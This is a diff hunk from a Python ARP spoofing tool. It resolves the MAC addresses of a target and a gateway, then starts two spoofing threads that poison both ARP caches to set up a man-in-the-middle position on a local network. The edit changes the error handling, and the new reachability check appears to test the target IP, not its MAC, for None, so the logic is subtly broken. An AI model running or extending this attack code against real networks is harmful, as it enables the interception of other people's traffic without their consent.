@@ -49,34 +49,27 @@ class Phonyhandler():
                     print(f"{bright}{yellow}\n [+] {reset}{blue}Spoofing started{reset} {blue}({reset} {bright}{red}Target{reset} :[{target_ip}] {bright}{red}Gateway{reset} :[{gateway_ip}] {bright}{red}Interface{reset} :[{interface}] {blue}){reset}")
                     print(f"{bright}{yellow} [+] {reset}{blue}MAC resolution {green}{bright}started{reset}")
                     
-                    try:
-                        target_mac=get_mac_addr(target_ip)
-                        
-                    except PermissionError as e:
-                        print(f"Error: {e}")
-                        exit(1) 
-                                           
-                    try:
-                        gateway_mac=get_mac_addr(gateway_ip)
-                        
-                    except PermissionError as e:
-                        print(f"Error: {e}")
-                        exit(1)
+                    # MAC resolution from ip.
+                    target_mac=get_mac_addr(target_ip)              
+                    gateway_mac=get_mac_addr(gateway_ip)
                     
-                    if target_ip==1 and gateway_mac==1:
-                        # Check the given ip is reachable or not.
+                    if target_ip is None and gateway_mac is None:
+                        # Check the given IP is reachable or not.
                         print(f"{bright}{yellow} [+] {reset}{blue}MAC resolution {bright}{red}Failed{reset} \n{bright}{yellow} [+]{reset} {blue}Check the ip is correct or not.\n{reset}")
                         exit(1)
-                    else:                      
+                    else:
+                        # Spoofing threads initalization.                  
                         print(f"{bright}{yellow} [+] {reset}{blue}Target spoof {bright}status:{green}running{reset}")
                         target_spoof_thread=Thread(target=arp_spoofer,args=(target_ip,target_mac,gateway_ip,interface))
                     
                         print(f"{bright}{yellow} [+] {reset}{blue}Gateway spoof {bright}status:{green}running{reset}")
                         gateway_spoof_thread=Thread(target=arp_spoofer,args=(gateway_ip,gateway_mac,target_ip,interface))
-                        # Spoofing threads 
+                        
+                        # Spoofing threads started.
                         target_spoof_thread.start()
                         gateway_spoof_thread.start()
                         
+                        # waiting for the tspoofing thread to end.
                         target_spoof_thread.join()
                         gateway_spoof_thread.join()
                         
